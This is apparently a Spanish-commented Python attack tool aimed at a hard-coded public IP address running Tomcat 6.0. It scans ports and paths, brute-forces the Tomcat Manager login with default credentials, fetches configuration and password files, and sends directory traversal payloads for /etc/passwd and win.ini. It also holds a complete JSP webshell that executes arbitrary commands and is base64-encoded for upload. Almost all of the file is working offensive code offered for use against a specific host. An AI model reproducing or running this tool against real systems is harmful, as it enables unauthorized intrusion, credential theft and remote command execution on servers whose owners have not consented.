# tomcat_explorer.py
import requests
import threading
import base64
import xml.etree.ElementTree as ET
from urllib.parse import urljoin
import sys
import time

class TomcatExplorer:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = {
            'puertos_abiertos': [],
            'rutas_encontradas': [],
            'vulnerabilidades': [],
            'credenciales_validas': [],
            'archivos_conf': []
        }

    def escanear_puertos(self):
        """Escaneo rápido de puertos comunes de Tomcat"""
        print("[*] Escaneando puertos...")
        puertos = [80, 443, 8080, 8009, 8005, 8443]
        
        for puerto in puertos:
            try:
                if puerto == 443:
                    respuesta = requests.get(f"https://{self.target}:{puerto}", timeout=2, verify=False)
                else:
                    respuesta = requests.get(f"http://{self.target}:{puerto}", timeout=2)
                
                if respuesta.status_code != 404:
                    self.results['puertos_abiertos'].append(puerto)
                    print(f"[+] Puerto {puerto} abierto")
            except:
                pass

    def descubrir_rutas(self):
        """Descubrir rutas comunes de Tomcat"""
        print("[*] Descubriendo rutas...")
        
        rutas = [
            '/', '/manager/html', '/manager/status', '/manager/jmxproxy',
            '/host-manager/html', '/docs/', '/examples/', '/admin/',
            '/webdav/', '/jsp-examples/', '/servlets-examples/',
            '/jsp/index.jsp', '/WEB-INF/web.xml', '/META-INF/context.xml'
        ]
        
        for ruta in rutas:
            for protocolo in ['http', 'https']:
                try:
                    url = f"{protocolo}://{self.target}{ruta}"
                    respuesta = self.session.get(url, timeout=3, verify=False)
                    
                    if respuesta.status_code == 200:
                        print(f"[+] Ruta encontrada: {url}")
                        self.results['rutas_encontradas'].append({
                            'url': url,
                            'status': respuesta.status_code,
                            'titulo': self.extraer_titulo(respuesta.text)
                        })
                    elif respuesta.status_code == 401:
                        print(f"[!] Ruta protegida: {url}")
                except:
                    pass

    def extraer_titulo(self, html):
        """Extraer título de la página HTML"""
        try:
            inicio = html.find('<title>')
            fin = html.find('</title>')
            if inicio != -1 and fin != -1:
                return html[inicio+7:fin]
        except:
            pass
        return "No title"

    def fuerza_bruta_tomcat(self):
        """Fuerza bruta para el Tomcat Manager"""
        print("[*] Probando credenciales en Tomcat Manager...")
        
        usuarios = ['admin', 'tomcat', 'manager', 'root', 'both', 'role1']
        contraseñas = [
            'admin', 'tomcat', 'manager', '', 'password', '123456',
            'tomcat6', 'tomcat6.0', 'admin123', 'P@ssw0rd'
        ]
        
        for usuario in usuarios:
            for contraseña in contraseñas:
                try:
                    url = f"https://{self.target}/manager/html"
                    respuesta = self.session.get(url, auth=(usuario, contraseña), verify=False)
                    
                    if respuesta.status_code == 200 and 'Tomcat Web Application Manager' in respuesta.text:
                        print(f"[+] CREDENCIALES VÁLIDAS: {usuario}:{contraseña}")
                        self.results['credenciales_validas'].append(f"{usuario}:{contraseña}")
                        return
                    else:
                        print(f"[-] Falló: {usuario}:{contraseña}")
                except:
                    pass

    def buscar_archivos_configuracion(self):
        """Buscar archivos de configuración sensibles"""
        print("[*] Buscando archivos de configuración...")
        
        archivos = [
            '/WEB-INF/web.xml',
            '/META-INF/context.xml',
            '/conf/tomcat-users.xml',
            '/conf/server.xml',
            '/logs/catalina.out',
            '/.git/config',
            '/web.xml',
            '/context.xml'
        ]
        
        for archivo in archivos:
            try:
                # Intentar acceso directo
                url = f"http://{self.target}{archivo}"
                respuesta = self.session.get(url, timeout=3)
                
                if respuesta.status_code == 200:
                    print(f"[+] Archivo encontrado: {url}")
                    self.results['archivos_conf'].append({
                        'archivo': archivo,
                        'contenido': respuesta.text[:500] + "..." if len(respuesta.text) > 500 else respuesta.text
                    })
            except:
                pass

    def probar_directory_traversal(self):
        """Probar vulnerabilidades de Directory Traversal"""
        print("[*] Probando Directory Traversal...")
        
        payloads = [
            '../../../../../../etc/passwd',
            '../../../../../../windows/win.ini',
            '../../../../../../conf/tomcat-users.xml',
            '../WEB-INF/web.xml',
            'file:///c:/windows/system.ini'
        ]
        
        rutas_vulnerables = [
            '/examples/jsp/include/include.jsp?page=',
            '/examples/jsp/num/num.jsp?num=',
            '/examples/servlets/servlet/RequestParamExample?param='
        ]
        
        for ruta in rutas_vulnerables:
            for payload in payloads:
                try:
                    url = f"http://{self.target}{ruta}{payload}"
                    respuesta = self.session.get(url, timeout=3)
                    
                    if respuesta.status_code == 200 and ('root:' in respuesta.text or 'for 16-bit' in respuesta.text):
                        print(f"[+] VULNERABILIDAD CONFIRMADA: {url}")
                        self.results['vulnerabilidades'].append(f"Directory Traversal: {url}")
                except:
                    pass

    def analizar_javascript(self):
        """Analizar archivos JavaScript en busca de información sensible"""
        print("[*] Analizando JavaScript...")
        
        js_files = [
            '/javascript/utilities.js',
            '/js/app.js',
            '/javascript/scriptAnimaciones.js',
            '/js/login.js'
        ]
        
        for js_file in js_files:
            try:
                url = f"http://{self.target}{js_file}"
                respuesta = self.session.get(url, timeout=3)
                
                if respuesta.status_code == 200:
                    contenido = respuesta.text
                    
                    # Buscar patrones interesantes
                    patrones = {
                        'contraseñas': r'(password|pass|pwd)[=:]\s*[\'"]([^\'"]+)[\'"]',
                        'usuarios': r'(user|username|usuario)[=:]\s*[\'"]([^\'"]+)[\'"]',
                        'urls': r'https?://[^\s\'"]+',
                        'tokens': r'[a-zA-Z0-9]{32,}'
                    }
                    
                    for tipo, patron in patrones.items():
                        import re
                        matches = re.findall(patron, contenido, re.IGNORECASE)
                        if matches:
                            print(f"[!] {tipo.upper()} encontrados en {js_file}: {matches[:3]}")
            except:
                pass

    def generar_reporte(self):
        """Generar reporte completo"""
        print("\n" + "="*50)
        print("REPORTE COMPLETO DE ESCANEO")
        print("="*50)
        
        print(f"\n[+] Puertos abiertos: {self.results['puertos_abiertos']}")
        print(f"\n[+] Rutas encontradas: {len(self.results['rutas_encontradas'])}")
        for ruta in self.results['rutas_encontradas']:
            print(f"    - {ruta['url']} ({ruta['titulo']})")
        
        print(f"\n[+] Credenciales válidas: {self.results['credenciales_validas']}")
        print(f"\n[+] Vulnerabilidades: {len(self.results['vulnerabilidades'])}")
        for vuln in self.results['vulnerabilidades']:
            print(f"    - {vuln}")
        
        print(f"\n[+] Archivos de configuración: {len(self.results['archivos_conf'])}")
        for archivo in self.results['archivos_conf']:
            print(f"    - {archivo['archivo']}")

    def ejecutar_escaneo_completo(self):
        """Ejecutar todas las pruebas"""
        print(f"[*] Iniciando escaneo completo de {self.target}")
        
        self.escanear_puertos()
        self.descubrir_rutas()
        self.fuerza_bruta_tomcat()
        self.buscar_archivos_configuracion()
        self.probar_directory_traversal()
        self.analizar_javascript()
        self.generar_reporte()

# Script de explotación avanzada
class TomcatExploiter:
    def __init__(self, target, usuario=None, contraseña=None):
        self.target = target
        self.usuario = usuario
        self.contraseña = contraseña
        self.session = requests.Session()
        self.session.verify = False

    def subir_webshell(self):
        """Intentar subir una webshell JSP"""
        print("[*] Intentando subir webshell...")
        
        webshell = """<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while (disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>"""
        
        # Codificar en base64 para posibles métodos de upload
        webshell_b64 = base64.b64encode(webshell.encode()).decode()
        print(f"[+] Webshell (Base64): {webshell_b64[:100]}...")

def main():
    target = "189.254.143.102"
    
    print("HERRAMIENTA DE ESCANEO TOMCAT 6.0")
    print("="*40)
    
    # Escaneo básico
    explorador = TomcatExplorer(target)
    explorador.ejecutar_escaneo_completo()
    
    # Explotación avanzada si hay credenciales
    if explorador.results['credenciales_validas']:
        creds = explorador.results['credenciales_validas'][0].split(':')
        explotador = TomcatExploiter(target, creds[0], creds[1])
        explotador.subir_webshell()

if __name__ == "__main__":
    # Desactivar advertencias SSL
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()